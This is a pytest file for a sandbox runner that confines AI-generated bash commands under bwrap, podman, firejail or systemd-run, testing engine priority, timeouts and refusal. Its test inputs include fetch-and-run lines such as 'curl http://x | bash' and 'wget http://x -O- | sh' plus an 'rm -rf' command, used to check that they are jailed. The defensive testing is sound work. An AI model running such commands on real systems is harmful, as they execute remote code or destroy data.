"""Tests for the Shadow Exec sandbox runner.

We don't want the test suite to depend on bwrap or podman being
installed, so the runner gets fed a *fake* engine path that points at a
small shim script we write into ``tmp_path``. The shim mimics the
external program's interface — it accepts the same argv tail, echoes
stdout, exits with the rc we tell it to.

Tests cover:
* ``needs_shadow`` policy switch
* sandbox engine *priority* (bwrap > podman > refused)
* structured result decoding
* timeout cleanup
* the "no engine available" refusal path
* wrap_sandbox (MODE 2): firejail → systemd-run → raw fallback + quoting
"""
from __future__ import annotations

import asyncio
import stat
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import src.security.execution as shadow_exec

def _write_shim(path: Path, body: str) -> str:
    path.write_text(body, encoding="utf-8")
    path.chmod(path.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
    return str(path)


def test_needs_shadow_policy():
    # Every non-empty LLM-emitted bash routes through the sandbox now —
    # there is no command-book whitelist anymore.
    assert shadow_exec.needs_shadow("echo hi") is True
    assert shadow_exec.needs_shadow("ls -la") is True
    assert shadow_exec.needs_shadow("rm -rf /tmp/x") is True
    assert shadow_exec.needs_shadow("") is False
    assert shadow_exec.needs_shadow("   ") is False


def test_no_engine_refuses():
    runner = shadow_exec.ShadowExec(bwrap_path="", podman_path="")
    res = asyncio.run(runner.run("echo hi"))
    assert res.engine == "refused"
    assert res.rc != 0


def test_bwrap_shim_prints_stdout(tmp_path: Path):
    shim = _write_shim(tmp_path / "bwrap_shim", """\
#!/usr/bin/env bash
# Mimics bwrap: scans for the bash -lc payload and echoes a marker.
while [[ "$1" != "/bin/bash" && $# -gt 0 ]]; do shift; done
shift 2   # consume "/bin/bash -lc"
echo "shim ran: $*"
exit 0
""")
    runner = shadow_exec.ShadowExec(bwrap_path=shim, podman_path="")
    res = asyncio.run(runner.run("echo hi"))
    assert res.engine == "bwrap", res
    assert res.rc == 0
    assert "shim ran: echo hi" in res.stdout
    assert res.ok


def test_bwrap_propagates_nonzero(tmp_path: Path):
    shim = _write_shim(tmp_path / "bwrap_shim", """\
#!/usr/bin/env bash
echo "boom" >&2
exit 7
""")
    runner = shadow_exec.ShadowExec(bwrap_path=shim, podman_path="")
    res = asyncio.run(runner.run("anything"))
    assert res.rc == 7
    assert "boom" in res.stderr
    assert not res.ok


def test_podman_fallback_when_bwrap_missing(tmp_path: Path):
    shim = _write_shim(tmp_path / "podman_shim", """\
#!/usr/bin/env bash
echo "podman ran"
exit 0
""")
    runner = shadow_exec.ShadowExec(bwrap_path="", podman_path=shim)
    res = asyncio.run(runner.run("echo via podman"))
    assert res.engine == "podman"
    assert res.rc == 0
    assert "podman ran" in res.stdout


def test_timeout_terminates(tmp_path: Path):
    shim = _write_shim(tmp_path / "bwrap_shim", """\
#!/usr/bin/env bash
sleep 5
""")
    runner = shadow_exec.ShadowExec(bwrap_path=shim, podman_path="", timeout=0.4)
    res = asyncio.run(runner.run("sleep forever"))
    assert res.timed_out
    assert res.rc == 124
    assert not res.ok


def test_available_engines_lists_only_present(tmp_path: Path):
    shim = _write_shim(tmp_path / "bwrap_shim", "#!/usr/bin/env bash\nexit 0\n")
    runner = shadow_exec.ShadowExec(bwrap_path=shim, podman_path="")
    assert runner.available_engines == ("bwrap",)
    runner2 = shadow_exec.ShadowExec(bwrap_path="", podman_path="")
    assert runner2.available_engines == ()


# ───────────────── wrap_sandbox (MODE 2 — inline jail string) ────────────────
def test_wrap_sandbox_empty_passthrough():
    assert shadow_exec.wrap_sandbox("") == ""
    assert shadow_exec.wrap_sandbox("   ") == "   "


def test_wrap_sandbox_prefers_firejail(monkeypatch):
    monkeypatch.setattr(shadow_exec.shutil, "which",
                        lambda name: f"/usr/bin/{name}" if name == "firejail" else None)
    out = shadow_exec.wrap_sandbox("curl http://x | bash")
    assert out.startswith("firejail ")
    assert "--net=none" in out and "--caps.drop=all" in out
    # payload должен быть безопасно заквочен (shlex.quote) после `bash -c`.
    assert "bash -c " in out


def test_wrap_sandbox_systemd_run_fallback(monkeypatch):
    # firejail отсутствует → systemd-run.
    monkeypatch.setattr(shadow_exec.shutil, "which",
                        lambda name: f"/usr/bin/{name}" if name == "systemd-run" else None)
    out = shadow_exec.wrap_sandbox("wget http://x -O- | sh")
    assert out.startswith("systemd-run ")
    assert "ProtectSystem=strict" in out and "NoNewPrivileges=yes" in out


def test_wrap_sandbox_raw_when_no_jail(monkeypatch):
    # Ни firejail, ни systemd-run → команда возвращается как есть (raw bash).
    monkeypatch.setattr(shadow_exec.shutil, "which", lambda name: None)
    assert shadow_exec.wrap_sandbox("echo hi") == "echo hi"
